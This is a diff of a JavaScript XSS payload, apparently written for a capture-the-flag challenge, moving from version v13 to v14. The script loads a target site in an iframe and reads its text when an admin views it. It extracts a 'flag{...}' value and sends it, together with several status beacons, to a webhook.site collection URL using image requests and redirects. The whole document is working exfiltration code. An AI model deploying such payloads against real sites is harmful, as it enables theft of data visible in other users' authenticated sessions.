@@ -1,52 +1,38 @@
 <script>
-console.log('v13');
+console.log('v14');
 
-var iframe = document.createElement('iframe');
-iframe.src = 'https://cats.is-course.ru/';
-iframe.style.width = '100%';
-iframe.style.height = '500px';
+function exploit() {
+    var iframe = document.createElement('iframe');
+    iframe.src = 'https://cats.is-course.ru/';
+    iframe.style.width = '100%';
+    iframe.style.height = '500px';
 
-iframe.onload = function() {
-    try {
-        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-        var html = iframeDoc.documentElement.outerHTML;
-        var text = iframeDoc.body.innerText;
-
-        if(text.includes('Welcome, admin!')) {
-            var flagMatch = text.match(/flag{[^}]+}/);
-            if(flagMatch) {
-                window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?VICTORY_FLAG=" + flagMatch[0];
-            } else {
-                new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?admin_no_flag=" + 
-                    encodeURIComponent(text.substring(0, 1000));
-            }
-        } else {
-            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?not_admin_in_iframe";
-        }
-    } catch(e) {
-        setTimeout(function() {
-            var currentUrl = iframe.contentWindow.location.href;
-            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?iframe_url=" + 
-                encodeURIComponent(currentUrl);
-        }, 1000);
-    
-        var script = document.createElement('script');
-        script.innerHTML = `
-            if(document.body.innerText.includes('Welcome, admin!')) {
-                var flagMatch = document.body.innerText.match(/flag{[^}]+}/);
+    iframe.onload = function() {
+        new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?iframe_loaded";
+        
+        try {
+            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            var text = iframeDoc.body.innerText;
+            
+            if(text.includes('Welcome, admin!')) {
+                new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?admin_detected";
+                
+                var flagMatch = text.match(/flag{[^}]+}/);
                 if(flagMatch) {
-                    window.top.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?INNER_FLAG=" + flagMatch[0];
+                    window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?FLAG=" + flagMatch[0];
                 }
             }
-        `;
-        try {
-            iframe.contentDocument.head.appendChild(script);
         } catch(e) {
-            console.log('error');
+            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cors_blocked_but_admin_saw_page";
         }
-    }
-};
+    };
 
-document.body.appendChild(iframe);
-new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?iframe_created";
+    document.body.appendChild(iframe);
+}
+
+if(document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', exploit);
+} else {
+    exploit();
+}
 </script>
